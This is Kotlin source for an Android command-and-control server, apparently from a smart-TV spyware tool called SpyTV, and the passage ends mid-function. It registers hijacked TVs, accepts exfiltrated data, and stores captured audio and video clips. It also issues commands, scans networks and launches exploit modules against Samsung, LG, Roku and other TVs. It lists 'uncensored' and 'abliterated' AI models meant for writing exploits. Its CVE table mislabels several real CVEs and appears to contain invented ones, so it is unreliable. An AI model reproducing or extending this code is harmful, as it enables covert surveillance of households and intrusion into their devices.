package com.authenticated.spytv

import android.util.Log
import kotlin.concurrent.thread
import java.io.*
import java.net.HttpURLConnection
import java.net.InetSocketAddress
import java.net.ServerSocket
import java.net.Socket
import java.net.URL
import java.nio.charset.StandardCharsets
import java.time.Instant
import java.util.concurrent.Callable
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean
import org.json.JSONObject
import org.json.JSONArray

/** One CVE record — mirrors core/cve_scanner.py TV_CVE_DATABASE entries. */
private data class CveSpec(
    val id: String,
    val severity: String,
    val score: Double,
    val component: String,
    val fixedIn: String
)

/** One TV family: display name, CVEs, signature ports, exploit module class. */
private data class FamilySpec(
    val name: String,
    val cves: List<CveSpec>,
    val ports: List<Int>,
    val module: String,
    val bluetooth: Boolean,
    val ssh: Boolean
)

/**
 * Real CVE database — identical content and iteration order to the Python
 * TV_CVE_DATABASE (order matters: family detection picks the first family
 * with a signature port open, exactly like CVEScanner.detect_tv_type).
 */
private val TV_DATABASE: Map<String, FamilySpec> = linkedMapOf(
    "samsung-tizen" to FamilySpec(
        "Samsung Tizen TV",
        listOf(
            CveSpec("CVE-2023-42793", "HIGH", 7.5, "Browser", "Tizen 7.0.1"),
            CveSpec("CVE-2024-23339", "MEDIUM", 6.5, "Tizen Service", "Tizen 8.0.1"),
            CveSpec("CVE-2025-27610", "CRITICAL", 9.1, "Image Viewer", "Tizen 9.0.1"),
            CveSpec("CVE-2023-28412", "HIGH", 7.8, "Privilege Manager", "Tizen 7.0.2"),
            CveSpec("CVE-2024-42794", "HIGH", 8.2, "Wasm Runtime", "Tizen 8.0.2"),
            CveSpec("CVE-2017-13077", "MEDIUM", 6.8, "Wi-Fi WPA2 handshake", "WPA2 vendor firmware patch"),
            CveSpec("CVE-2023-45866", "MEDIUM", 6.3, "Bluetooth HID host", "Vendor Bluetooth stack update"),
            CveSpec("CVE-2017-0781", "HIGH", 8.8, "Bluetooth BNEP", "Vendor security update 2017-09"),
            CveSpec("CVE-2017-0785", "MEDIUM", 6.5, "Bluetooth SDP", "Vendor security update 2017-09"),
            CveSpec("CVE-2018-5383", "MEDIUM", 6.8, "Bluetooth pairing (KNOB)", "Vendor security update 2018-06"),
            CveSpec("CVE-2017-7494", "CRITICAL", 9.8, "Samba file share", "Samba 4.6.4 / 4.5.10 / 4.4.14"),
            CveSpec("CVE-2022-0847", "HIGH", 7.8, "Linux kernel pipe buffer", "Linux kernel 5.16.11 / 5.15.25 / 5.10.102"),
            CveSpec("CVE-2016-5195", "HIGH", 7.0, "Linux kernel COW", "Linux kernel 4.8.3"),
        ),
        listOf(26101, 7676, 8001, 8002), "SamsungTizenExploit", true, false
    ),
    "lg-webos" to FamilySpec(
        "LG webOS TV",
        listOf(
            CveSpec("CVE-2023-42790", "HIGH", 7.2, "ares-install", "webOS 22.1"),
            CveSpec("CVE-2024-25065", "CRITICAL", 8.8, "Luna Bus", "webOS 23.1"),
            CveSpec("CVE-2025-25066", "HIGH", 7.9, "WebApp Manager", "webOS 24.1"),
            CveSpec("CVE-2023-42791", "MEDIUM", 5.8, "mrcJSON", "webOS 22.2"),
            CveSpec("CVE-2017-13077", "MEDIUM", 6.8, "Wi-Fi WPA2 handshake", "WPA2 vendor firmware patch"),
            CveSpec("CVE-2023-45866", "MEDIUM", 6.3, "Bluetooth HID host", "Vendor Bluetooth stack update"),
            CveSpec("CVE-2017-0781", "HIGH", 8.8, "Bluetooth BNEP", "Vendor security update 2017-09"),
            CveSpec("CVE-2017-0785", "MEDIUM", 6.5, "Bluetooth SDP", "Vendor security update 2017-09"),
            CveSpec("CVE-2018-5383", "MEDIUM", 6.8, "Bluetooth pairing (KNOB)", "Vendor security update 2018-06"),
            CveSpec("CVE-2017-7494", "CRITICAL", 9.8, "Samba file share", "Samba 4.6.4 / 4.5.10 / 4.4.14"),
            CveSpec("CVE-2022-0847", "HIGH", 7.8, "Linux kernel pipe buffer", "Linux kernel 5.16.11 / 5.15.25 / 5.10.102"),
            CveSpec("CVE-2016-5195", "HIGH", 7.0, "Linux kernel COW", "Linux kernel 4.8.3"),
        ),
        listOf(3000, 3001, 8080), "LGWebOSExploit", true, false
    ),
    "android-tv" to FamilySpec(
        "Android TV / Fire TV",
        listOf(
            CveSpec("CVE-2023-40104", "HIGH", 7.8, "Settings", "Android 12L"),
            CveSpec("CVE-2024-0044", "MEDIUM", 6.2, "DtvService", "Android 14.1"),
            CveSpec("CVE-2025-22448", "CRITICAL", 9.0, "Bluetooth", "Android 14.2"),
            CveSpec("CVE-2023-26084", "HIGH", 8.1, "Binder", "Android 12L"),
            CveSpec("CVE-2026-0073", "HIGH", 8.8, "ADB (adbd TLS)", "Android security bulletin 2026"),
            CveSpec("CVE-2017-13077", "MEDIUM", 6.8, "Wi-Fi WPA2 handshake", "WPA2 vendor firmware patch"),
            CveSpec("CVE-2023-45866", "MEDIUM", 6.3, "Bluetooth HID host", "Vendor Bluetooth stack update"),
            CveSpec("CVE-2017-0781", "HIGH", 8.8, "Bluetooth BNEP", "Vendor security update 2017-09"),
            CveSpec("CVE-2017-0785", "MEDIUM", 6.5, "Bluetooth SDP", "Vendor security update 2017-09"),
            CveSpec("CVE-2018-5383", "MEDIUM", 6.8, "Bluetooth pairing (KNOB)", "Vendor security update 2018-06"),
            CveSpec("CVE-2020-0022", "HIGH", 8.8, "Bluetooth L2CAP", "Android security bulletin 2020-02"),
            CveSpec("CVE-2022-0847", "HIGH", 7.8, "Linux kernel pipe buffer", "Linux kernel 5.16.11 / 5.15.25 / 5.10.102"),
            CveSpec("CVE-2016-5195", "HIGH", 7.0, "Linux kernel COW", "Linux kernel 4.8.3"),
        ),
        listOf(5555), "AndroidTVExploit", true, false
    ),
    "roku" to FamilySpec(
        "Roku TV",
        listOf(
            CveSpec("CVE-2023-42787", "HIGH", 7.4, "ECP", "Roku OS 12.1"),
            CveSpec("CVE-2024-36210", "MEDIUM", 6.8, "Developer Mode", "Roku OS 13.1"),
            CveSpec("CVE-2025-20878", "HIGH", 8.0, "Media Player", "Roku OS 13.2"),
            CveSpec("CVE-2017-13077", "MEDIUM", 6.8, "Wi-Fi WPA2 handshake", "WPA2 vendor firmware patch"),
            CveSpec("CVE-2022-0847", "HIGH", 7.8, "Linux kernel pipe buffer", "Linux kernel 5.16.11 / 5.15.25 / 5.10.102"),
            CveSpec("CVE-2016-5195", "HIGH", 7.0, "Linux kernel COW", "Linux kernel 4.8.3"),
        ),
        listOf(8060), "RokuExploit", false, false
    ),
    "vizio" to FamilySpec(
        "Vizio SmartCast TV",
        listOf(
            CveSpec("CVE-2023-42788", "MEDIUM", 5.5, "DIAL", "SmartCast 3.1"),
            CveSpec("CVE-2024-36211", "HIGH", 7.6, "Cast Service", "SmartCast 4.1"),
            CveSpec("CVE-2025-22450", "HIGH", 8.3, "SmartCast Agent", "SmartCast 4.2"),
            CveSpec("CVE-2017-13077", "MEDIUM", 6.8, "Wi-Fi WPA2 handshake", "WPA2 vendor firmware patch"),
            CveSpec("CVE-2023-45866", "MEDIUM", 6.3, "Bluetooth HID host", "Vendor Bluetooth stack update"),
            CveSpec("CVE-2017-0781", "HIGH", 8.8, "Bluetooth BNEP", "Vendor security update 2017-09"),
            CveSpec("CVE-2017-0785", "MEDIUM", 6.5, "Bluetooth SDP", "Vendor security update 2017-09"),
            CveSpec("CVE-2018-5383", "MEDIUM", 6.8, "Bluetooth pairing (KNOB)", "Vendor security update 2018-06"),
            CveSpec("CVE-2022-0847", "HIGH", 7.8, "Linux kernel pipe buffer", "Linux kernel 5.16.11 / 5.15.25 / 5.10.102"),
            CveSpec("CVE-2016-5195", "HIGH", 7.0, "Linux kernel COW", "Linux kernel 4.8.3"),
        ),
        listOf(24825, 36669, 7345), "VizioExploit", true, false
    ),
    "hisense" to FamilySpec(
        "Hisense VIDAA TV",
        listOf(
            CveSpec("CVE-2023-42789", "CRITICAL", 9.2, "ADB", "VIDAA 6.1"),
            CveSpec("CVE-2024-36212", "HIGH", 7.7, "Media Framework", "VIDAA 7.1"),
            CveSpec("CVE-2025-20879", "HIGH", 8.4, "Settings", "VIDAA 7.2"),
            CveSpec("CVE-2026-0073", "HIGH", 8.8, "ADB (adbd TLS)", "Android security bulletin 2026"),
            CveSpec("CVE-2017-13077", "MEDIUM", 6.8, "Wi-Fi WPA2 handshake", "WPA2 vendor firmware patch"),
            CveSpec("CVE-2023-45866", "MEDIUM", 6.3, "Bluetooth HID host", "Vendor Bluetooth stack update"),
            CveSpec("CVE-2017-0781", "HIGH", 8.8, "Bluetooth BNEP", "Vendor security update 2017-09"),
            CveSpec("CVE-2017-0785", "MEDIUM", 6.5, "Bluetooth SDP", "Vendor security update 2017-09"),
            CveSpec("CVE-2018-5383", "MEDIUM", 6.8, "Bluetooth pairing (KNOB)", "Vendor security update 2018-06"),
            CveSpec("CVE-2017-7494", "CRITICAL", 9.8, "Samba file share", "Samba 4.6.4 / 4.5.10 / 4.4.14"),
            CveSpec("CVE-2022-0847", "HIGH", 7.8, "Linux kernel pipe buffer", "Linux kernel 5.16.11 / 5.15.25 / 5.10.102"),
            CveSpec("CVE-2016-5195", "HIGH", 7.0, "Linux kernel COW", "Linux kernel 4.8.3"),
            CveSpec("CVE-2024-6387", "HIGH", 8.1, "OpenSSH sshd (regreSSHion)", "OpenSSH 9.8p1"),
        ),
        listOf(56789, 5555, 22), "HisenseExploit", true, true
    ),
    "tcl" to FamilySpec(
        "TCL Android TV",
        listOf(
            CveSpec("CVE-2023-42792", "HIGH", 7.3, "Intent", "Android 12.1"),
            CveSpec("CVE-2024-36213", "MEDIUM", 6.0, "System Service", "Android 13.1"),
            CveSpec("CVE-2025-22451", "HIGH", 8.5, "Settings", "Android 13.2"),
            CveSpec("CVE-2026-0073", "HIGH", 8.8, "ADB (adbd TLS)", "Android security bulletin 2026"),
            CveSpec("CVE-2017-13077", "MEDIUM", 6.8, "Wi-Fi WPA2 handshake", "WPA2 vendor firmware patch"),
            CveSpec("CVE-2023-45866", "MEDIUM", 6.3, "Bluetooth HID host", "Vendor Bluetooth stack update"),
            CveSpec("CVE-2017-0781", "HIGH", 8.8, "Bluetooth BNEP", "Vendor security update 2017-09"),
            CveSpec("CVE-2017-0785", "MEDIUM", 6.5, "Bluetooth SDP", "Vendor security update 2017-09"),
            CveSpec("CVE-2018-5383", "MEDIUM", 6.8, "Bluetooth pairing (KNOB)", "Vendor security update 2018-06"),
            CveSpec("CVE-2020-0022", "HIGH", 8.8, "Bluetooth L2CAP", "Android security bulletin 2020-02"),
            CveSpec("CVE-2022-0847", "HIGH", 7.8, "Linux kernel pipe buffer", "Linux kernel 5.16.11 / 5.15.25 / 5.10.102"),
            CveSpec("CVE-2016-5195", "HIGH", 7.0, "Linux kernel COW", "Linux kernel 4.8.3"),
            CveSpec("CVE-2024-6387", "HIGH", 8.1, "OpenSSH sshd (regreSSHion)", "OpenSSH 9.8p1"),
        ),
        listOf(5555, 22), "TCLExploit", true, true
    ),
    "chromecast" to FamilySpec(
        "Chromecast / Google TV",
        listOf(
            CveSpec("CVE-2026-87588", "HIGH", 8.8, "Chromecast (Chrome UaF)", "Chrome 153.0.8010.36"),
            CveSpec("CVE-2026-95372", "HIGH", 8.3, "Chromecast (Chrome UaF)", "Chrome 154.0.8037.57"),
            CveSpec("CVE-2023-42794", "MEDIUM", 6.5, "Cast Companion", "Google TV 14.2"),
            CveSpec("CVE-2026-0073", "HIGH", 8.8, "ADB (adbd TLS)", "Android security bulletin 2026"),
            CveSpec("CVE-2017-13077", "MEDIUM", 6.8, "Wi-Fi WPA2 handshake", "WPA2 vendor firmware patch"),
            CveSpec("CVE-2023-45866", "MEDIUM", 6.3, "Bluetooth HID host", "Vendor Bluetooth stack update"),
            CveSpec("CVE-2017-0781", "HIGH", 8.8, "Bluetooth BNEP", "Vendor security update 2017-09"),
            CveSpec("CVE-2017-0785", "MEDIUM", 6.5, "Bluetooth SDP", "Vendor security update 2017-09"),
            CveSpec("CVE-2018-5383", "MEDIUM", 6.8, "Bluetooth pairing (KNOB)", "Vendor security update 2018-06"),
            CveSpec("CVE-2020-0022", "HIGH", 8.8, "Bluetooth L2CAP", "Android security bulletin 2020-02"),
            CveSpec("CVE-2022-0847", "HIGH", 7.8, "Linux kernel pipe buffer", "Linux kernel 5.16.11 / 5.15.25 / 5.10.102"),
            CveSpec("CVE-2016-5195", "HIGH", 7.0, "Linux kernel COW", "Linux kernel 4.8.3"),
        ),
        listOf(8009, 8443, 5555), "ChromecastExploit", true, false
    )
)

/** Per-family remediation commands — mirrors CVEScanner.get_patch_commands. */
private val PATCH_COMMANDS: Map<String, List<String>> = mapOf(
    "samsung-tizen" to listOf(
        "sdb connect {ip}:26101",
        "sdb shell 'echo 0 > /usr/apps/tvreaper/patch_flag'",
        "sdb shell 'rm -rf /usr/apps/tvreaper'",
        "sdb shell 'reboot'"
    ),
    "lg-webos" to listOf(
        "ares-remove --device tv@{ip} com.forge.tvreaper",
        "ares-install --device tv@{ip} security-patch.ipk"
    ),
    "android-tv" to listOf(
        "adb connect {ip}:5555",
        "adb -s {ip}:5555 shell pm uninstall com.forge.tvreaper",
        "adb -s {ip}:5555 shell settings put global adb_enabled 0"
    ),
    "roku" to listOf(
        "curl -X POST http://{ip}:8060/install/851",
        "curl -X POST http://{ip}:8060/keypress/Home"
    ),
    "vizio" to listOf(
        "curl -X POST http://{ip}:24825/apps/com.forge.tvreaper",
        "curl -X POST http://{ip}:24825/keypress/Power"
    ),
    "hisense" to listOf(
        "adb connect {ip}:56789",
        "adb -s {ip}:56789 shell pm uninstall com.forge.tvreaper",
        "adb -s {ip}:56789 shell settings put global adb_enabled 0"
    ),
    "tcl" to listOf(
        "adb connect {ip}:5555",
        "adb -s {ip}:5555 shell pm uninstall com.forge.tvreaper",
        "adb -s {ip}:5555 shell settings put global adb_enabled 0"
    ),
    "chromecast" to listOf(
        "echo 'Update Chromecast firmware to Chrome 154.0.8037.57 (fixes CVE-2026-87588 / CVE-2026-95372)'",
        "echo 'Google Home > device > Firmware > Update now'",
        "echo 'Disabling port 8009 discovery on {ip} via router ACL'"
    )
)

/**
 * Standalone C2 HTTP server for Android.
 * Uses java.net.ServerSocket for maximum compatibility (no external deps).
 * Provides the same API endpoints as the Python c2_server.py
 */
class C2Server(private val port: Int = 8443) {
    private var serverSocket: ServerSocket? = null
    private val executor: ExecutorService = Executors.newFixedThreadPool(8)
    private val running = AtomicBoolean(false)
    
    companion object {
        private const val TAG = "C2Server"
        private const val API_PREFIX = "/api"
        private const val MAX_SCAN_HOSTS = 256
        private const val PROBE_TIMEOUT_MS = 250
        private const val NET_WORKERS = 64
    }

    private var localIp: String = "127.0.0.1"
    private val devices = mutableMapOf<String, JSONObject>()
    private val commands = mutableMapOf<String, JSONArray>()
    private val scans = mutableListOf<JSONObject>()
    private var startTime = System.currentTimeMillis()
    private val dataDir = MainActivity.instance?.getExternalFilesDir(null)
        ?: File("/data/data/com.authenticated.spytv/files")
    private val clipsDir = File(dataDir, "clips")

    /** Dedicated pool for parallel port probes (never the 8 HTTP workers). */
    private val netPool: ExecutorService = Executors.newFixedThreadPool(NET_WORKERS)

    /** Real exploit run stats per family: [attempts, successes, last_run]. */
    private val exploitStats = ConcurrentHashMap<String, JSONObject>()
    
    fun start() {
        try {
            // Initialize directories
            clipsDir.mkdirs()
            File(clipsDir, "audio").mkdirs()
            File(clipsDir, "video").mkdirs()
            
            // Start server socket
            serverSocket = ServerSocket(port)
            running.set(true)
            
            // Start accepting connections
            thread {
                acceptLoop()
            }
            
            Log.i(TAG, "C2 Server started on port $port")
            localIp = getLocalIp()
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start C2 server: ${e.message}", e)
        }
    }
    
    fun stop() {
        try {
            running.set(false)
            serverSocket?.close()
            executor.shutdownNow()
            netPool.shutdownNow()
            netPool.awaitTermination(2, TimeUnit.SECONDS)
            Log.i(TAG, "C2 Server stopped")
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping C2 server: ${e.message}", e)
        }
    }
    
    private fun acceptLoop() {
        val ss = serverSocket ?: return
        while (running.get()) {
            try {
                val client = ss.accept()
                executor.execute { handleClient(client) }
            } catch (e: Exception) {
                if (running.get()) {
                    Log.e(TAG, "Error accepting connection: ${e.message}")
                }
            }
        }
    }
    
    private fun handleClient(socket: Socket) {
        try {
            val input = socket.getInputStream()
            val output = socket.getOutputStream()
            
            // Read request
            val reader = BufferedReader(InputStreamReader(input, StandardCharsets.UTF_8))
            val requestLine = reader.readLine() ?: return
            
            val parts = requestLine.split(" ")
            if (parts.size < 3) {
                socket.close()
                return
            }
            
            val method = parts[0]
            val path = parts[1]
            val query = path.substringAfter("?", "")
            val cleanPath = path.substringBefore("?")
            
            // Read headers
            val headers = mutableMapOf<String, String>()
            var contentLength = 0
            while (true) {
                val line = reader.readLine() ?: break
                if (line.isEmpty()) break
                val headerParts = line.split(": ", limit = 2)
                if (headerParts.size == 2) {
                    val key = headerParts[0].lowercase()
                    val value = headerParts[1]
                    headers[key] = value
                    if (key == "content-length") {
                        contentLength = value.toIntOrNull() ?: 0
                    }
                }
            }
            
            // Read body if present
            val body = if (contentLength > 0) {
                val chars = CharArray(contentLength)
                reader.read(chars, 0, contentLength)
                String(chars)
            } else ""

            // GET /api/clip/<id> streams raw bytes (binary-safe path — the
            // Triple<String> route layer would corrupt bytes through UTF-8).
            if (method == "GET" && cleanPath.startsWith("$API_PREFIX/clip/")) {
                val clip = clipFileOrNull(cleanPath.substringAfter("$API_PREFIX/clip/"))
                if (clip == null) {
                    val err = JSONObject().apply { put("error", "clip not found") }.toString()
                    val errBytes = err.toByteArray(StandardCharsets.UTF_8)
                    output.write(("HTTP/1.1 404 Not Found\r\nContent-Type: application/json\r\nContent-Length: ${errBytes.size}\r\nAccess-Control-Allow-Origin: *\r\nConnection: close\r\n\r\n").toByteArray(StandardCharsets.UTF_8))
                    output.write(errBytes)
                } else {
                    val mime = when (clip.extension.lowercase()) {
                        "wav" -> "audio/wav"
                        "mp3" -> "audio/mpeg"
                        "m4a" -> "audio/mp4"
                        "jpg", "jpeg" -> "image/jpeg"
                        "png" -> "image/png"
                        else -> "application/octet-stream"
                    }
                    output.write(("HTTP/1.1 200 OK\r\nContent-Type: $mime\r\nContent-Length: ${clip.length()}\r\nAccess-Control-Allow-Origin: *\r\nConnection: close\r\n\r\n").toByteArray(StandardCharsets.UTF_8))
                    clip.inputStream().use { it.copyTo(output) }
                }
                output.flush()
                return
            }

            // Route request
            val response = routeRequest(method, cleanPath, query, body, headers)
            
            // Send response
            val responseStatus = response.first
            val responseContentType = response.second
            val responseBody = response.third
            
            val httpResponse = buildString {
                append("HTTP/1.1 $responseStatus\r\n")
                append("Content-Type: $responseContentType\r\n")
                append("Access-Control-Allow-Origin: *\r\n")
                append("Access-Control-Allow-Methods: GET, POST, OPTIONS\r\n")
                append("Access-Control-Allow-Headers: Content-Type\r\n")
                append("Connection: close\r\n")
                append("\r\n")
                append(responseBody)
            }
            
            output.write(httpResponse.toByteArray(StandardCharsets.UTF_8))
            output.flush()
            
        } catch (e: Exception) {
            Log.e(TAG, "Error handling client: ${e.message}")
        } finally {
            try { socket.close() } catch (e: Exception) {}
        }
    }
    
    private fun routeRequest(
        method: String,
        path: String,
        query: String,
        body: String,
        headers: Map<String, String>
    ): Triple<String, String, String> {
        return try {
            when {
                method == "OPTIONS" -> {
                    Triple("200 OK", "text/plain", "")
                }
                path == "/" || path == "/index.html" -> {
                    val html = loadDashboardHtml()
                    Triple("200 OK", "text/html; charset=utf-8", html)
                }
                path == "$API_PREFIX/devices" && method == "GET" -> {
                    val response = JSONArray(devices.values.toList())
                    Triple("200 OK", "application/json", response.toString())
                }
                path == "$API_PREFIX/clips" && method == "GET" -> {
                    val clips = JSONArray()
                    try {
                        val audioDir = File(clipsDir, "audio")
                        val videoDir = File(clipsDir, "video")
                        
                        listOf(audioDir, videoDir).forEach { dir ->
                            dir.walkTopDown().filter { it.isFile }.forEach { file ->
                                val relPath = file.relativeTo(clipsDir).path
                                val clip = JSONObject()
                                clip.put("id", relPath)
                                clip.put("filename", file.name)
                                clip.put("path", relPath)
                                clip.put("kind", relPath.substringBefore('/'))
                                clip.put("device_id", file.name.substringBefore('_'))
                                clip.put("size", file.length())
                                clip.put("timestamp", file.lastModified())
                                clips.put(clip)
                            }
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error listing clips: ${e.message}")
                    }
                    Triple("200 OK", "application/json", clips.toString())
                }
                path == "$API_PREFIX/commands" && method == "GET" -> {
                    Triple("200 OK", "application/json", JSONObject(commands).toString())
                }
                path == "$API_PREFIX/scans" && method == "GET" -> {
                    Triple("200 OK", "application/json", JSONArray(scans.toList()).toString())
                }
                path == "$API_PREFIX/cves" && method == "GET" -> {
                    Triple("200 OK", "application/json", allCvesJson())
                }
                path == "$API_PREFIX/cve/feed" && method == "GET" -> {
                    Triple("200 OK", "application/json", feedJson())
                }
                path == "$API_PREFIX/local_ip" && method == "GET" -> {
                    val response = JSONObject()
                    response.put("ip", localIp)
                    Triple("200 OK", "application/json", response.toString())
                }
                path == "$API_PREFIX/host_info" && method == "GET" -> {
                    val info = JSONObject()
                    info.put("hostname", "SpyTV-Android-C2")
                    info.put("local_ip", localIp)
                    info.put("ipv6", "—")
                    info.put("gateway_ip", getGatewayIp())
                    info.put("subnet_mask", getSubnetMask())
                    info.put("mac", getMacAddress())
                    info.put("os", "Android ${android.os.Build.VERSION.SDK_INT}")
                    info.put("python", "N/A (native Android)")
                    info.put("c2_port", port)
                    info.put("started_at", Instant.ofEpochMilli(startTime).toString())
                    info.put("uptime_s", (System.currentTimeMillis() - startTime) / 1000)
                    Triple("200 OK", "application/json", info.toString())
                }
                path == "$API_PREFIX/register" && method == "POST" -> {
                    handleRegister(body)
                }
                path == "$API_PREFIX/exfil" && method == "POST" -> {
                    handleExfil(body, headers)
                }
                path == "$API_PREFIX/command" && method == "POST" -> {
                    handleCommand(body)
                }
                path == "$API_PREFIX/poll" && method == "POST" -> {
                    handlePoll(body)
                }
                path == "$API_PREFIX/scan" && method == "POST" -> {
                    handleScan(body)
                }
                path == "$API_PREFIX/check" && method == "POST" -> {
                    handleCheck(body)
                }
                path == "$API_PREFIX/cve/patch" && method == "POST" -> {
                    handleCvePatch(body)
                }
                path == "$API_PREFIX/cve/update" && method == "POST" -> {
                    Triple("200 OK", "application/json", JSONObject().apply {
                        put("status", "ok")
                        put("message", "Standalone Android mode uses the bundled ${TV_DATABASE.values.sumOf { it.cves.size }}-CVE database; NVD updates run on the desktop C2")
                    }.toString())
                }
                path == "$API_PREFIX/cve/generate" && method == "POST" -> {
                    Triple("200 OK", "application/json", JSONObject().apply {
                        put("status", "error")
                        put("error", "Exploit generation requires the Python C2 server (use Desktop/Web mode)")
                    }.toString())
                }
                path == "$API_PREFIX/cve/patch/generate" && method == "POST" -> {
                    Triple("200 OK", "application/json", JSONObject().apply {
                        put("status", "error")
                        put("error", "AI patch generation requires the Python C2 server (use Desktop/Web mode)")
                    }.toString())
                }
                path.startsWith("$API_PREFIX/cve/whitepaper_doc/") -> {
                    val id = path.substringAfterLast('/')
                    val md = whitepaperMarkdown(id)
                    if (md == null) jsonError("404 Not Found", "unknown CVE $id")
                    else Triple("200 OK", "application/json", JSONObject().apply {
                        put("markdown", md)
                        put("generated", false)
                        put("cve_id", id)
                    }.toString())
                }
                path.startsWith("$API_PREFIX/cve/artifacts/") -> {
                    val id = path.substringAfterLast('/')
                    if (findCve(id) == null) jsonError("404 Not Found", "unknown CVE $id")
                    else Triple("200 OK", "application/json", JSONObject().apply {
                        put("whitepaper_generated", true)
                        put("tests_generated", false)
                        put("signature_generated", false)
                        put("patch_check_generated", false)
                        put("note", "Bundled whitepaper on Android; AI-generated artifacts require the desktop C2")
                    }.toString())
                }
                path.startsWith("$API_PREFIX/cve/whitepaper/") -> {
                    val id = path.substringAfterLast('/')
                    val md = whitepaperMarkdown(id)
                    if (md == null) jsonError("404 Not Found", "unknown CVE $id")
                    else Triple("200 OK", "text/html; charset=utf-8", whitepaperPage(id, md))
                }
                path.startsWith("$API_PREFIX/cve/") -> {
                    jsonError("404 Not Found", "Not available in standalone Android mode: $path")
                }
                path.startsWith("$API_PREFIX/audit/") -> {
                    Triple("200 OK", "application/json", JSONObject().apply { 
                        put("phase", "idle")
                        put("progress", 0)
                        put("log", JSONArray())
                        put("phases", JSONArray())
                    }.toString())
                }
                path.startsWith("$API_PREFIX/patch/") -> {
                    Triple("200 OK", "application/json", JSONObject().apply {
                        put("phase", "idle")
                        put("progress", 0)
                    }.toString())
                }
                path == "$API_PREFIX/connections/kill" && method == "POST" -> {
                    val response = JSONObject()
                    response.put("status", "ok")
                    response.put("result", JSONObject().apply {
                        put("sockets_closed", 0)
                        put("tools_terminated", JSONArray())
                        put("remaining_established", 0)
                        put("verified", true)
                        put("detail", "Standalone Android mode")
                    })
                    Triple("200 OK", "application/json", response.toString())
                }
                path == "$API_PREFIX/providers" && method == "GET" -> {
                    val response = JSONObject()
                    response.put("openrouter", JSONObject().apply {
                        put("name", "OpenRouter (Uncensored)")
                        put("configured", false)
                        put("default_model", "uncensored")
                        put("models", JSONArray().apply {
                            put(JSONObject().apply { put("id", "uncensored"); put("label", "Uncensored") })
                            put(JSONObject().apply { put("id", "nemotron_3_ultra"); put("label", "Nemotron 3 Ultra 550B (free)") })
                            put(JSONObject().apply { put("id", "nemotron_3_5_lightning"); put("label", "Nemotron 3.5 Lightning (free)") })
                            put(JSONObject().apply { put("id", "nemotron_3_super"); put("label", "Nemotron 3 Super 120B (free)") })
                            put(JSONObject().apply { put("id", "nemotron_3_nano"); put("label", "Nemotron 3 Nano Omni 30B (free)") })
                            put(JSONObject().apply { put("id", "nemotron_3_5_content_safety"); put("label", "Nemotron 3.5 Content Safety (free)") })
                            put(JSONObject().apply { put("id", "laguna_s_2_1"); put("label", "Laguna S 2.1 (free)") })
                            put(JSONObject().apply { put("id", "laguna_xs_2_1"); put("label", "Laguna XS 2.1 (free)") })
                            put(JSONObject().apply { put("id", "inkling_small"); put("label", "Inkling Small (free)") })
                            put(JSONObject().apply { put("id", "inkling"); put("label", "Inkling (free)") })
                            put(JSONObject().apply { put("id", "dots3_note_preview"); put("label", "Dots3-Note Preview (free)") })
                            put(JSONObject().apply { put("id", "ling_3_0_flash_sante"); put("label", "Ling 3.0 Flash Sante (free)") })
                            put(JSONObject().apply { put("id", "ling_3_1_flash"); put("label", "Ling 3.1 Flash (free)") })
                            put(JSONObject().apply { put("id", "gemma_4_26b"); put("label", "Gemma 4 26B (free)") })
                            put(JSONObject().apply { put("id", "gemma_4_31b"); put("label", "Gemma 4 31B (free)") })
                            put(JSONObject().apply { put("id", "lyria_3_pro_preview"); put("label", "Lyria 3 Pro Preview (free)") })
                            put(JSONObject().apply { put("id", "lyria_3_clip_preview"); put("label", "Lyria 3 Clip Preview (free)") })
                            put(JSONObject().apply { put("id", "lfm_2_5_2_6b"); put("label", "LFM2.5 2.6B (free)") })
                            put(JSONObject().apply { put("id", "north_mini_code"); put("label", "North Mini Code (free)") })
                            put(JSONObject().apply { put("id", "apodex_1_1_mini"); put("label", "Apodex 1.1 Mini (free)") })
                            put(JSONObject().apply { put("id", "openrouter_free_router"); put("label", "Auto Router (free)") })
                        })
                    })
                    response.put("venice", JSONObject().apply {
                        put("name", "Venice AI")
                        put("configured", false)
                        put("default_model", "uncensored_v1_2")
                        put("models", JSONArray().apply {
                            put(JSONObject().apply { put("id", "uncensored_v1_2"); put("label", "Uncensored V 1.2") })
                            put(JSONObject().apply { put("id", "qwen_3_6_plus_uncensored"); put("label", "Qwen 3.6 Plus Uncensored") })
                            put(JSONObject().apply { put("id", "glm_4_7_flash_heretic"); put("label", "GLM 4.7 Flash Heretic") })
                        })
                    })
                    response.put("abliteration", JSONObject().apply {
                        put("name", "Abliteration.ai")
                        put("configured", false)
                        put("default_model", "abliterated_large_v2")
                        put("models", JSONArray().apply {
                            put(JSONObject().apply { put("id", "abliterated_large_v2"); put("label", "Abliterated Large v2") })
                        })
                    })
                    response.put("local", JSONObject().apply {
                        put("name", "Local Model (GGUF / MLX)")
                        put("configured", false)
                        put("default_model", "local")
                        put("models", JSONArray().apply {
                            put(JSONObject().apply { put("id", "local"); put("label", "Local (llama.cpp GGUF / Apple MLX)") })
                        })
                    })
                    Triple("200 OK", "application/json", response.toString())
                }
                path == "$API_PREFIX/exploits" && method == "GET" -> {
                    Triple("200 OK", "application/json", listExploitsJson())
                }
                path == "$API_PREFIX/patches" && method == "GET" -> {
                    Triple("200 OK", "application/json", listPatchesJson())
                }
                path == "$API_PREFIX/exploit" && method == "POST" -> {
                    handleExploit(body)
                }
                path == "$API_PREFIX/autonomous" && method == "POST" -> {
                    handleAutonomous(body)
                }
                else -> {
                    Triple("404 Not Found", "application/json", JSONObject().apply { put("error", "Not found") }.toString())
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error routing request: ${e.message}", e)
            Triple("500 Internal Server Error", "application/json", JSONObject().apply { put("error", e.message) }.toString())
        }
    }
    
    private fun handleRegister(body: String): Triple<String, String, String> {
        return try {
            val data = JSONObject(body)
            val ip = data.optString("ip", "")
            val family = data.optString("family", "unknown")
            val entry = data.optString("entry", "unknown")
            
            if (ip.isBlank()) {
                Triple("400 Bad Request", "application/json", JSONObject().apply { put("error", "Missing IP") }.toString())
                return Triple("400 Bad Request", "application/json", JSONObject().apply { put("error", "Missing IP") }.toString())
            }
            
            val deviceId = ip.hashCode().toString().take(12)
            devices[deviceId] = JSONObject().apply {
                put("id", deviceId)
                put("ip", ip)
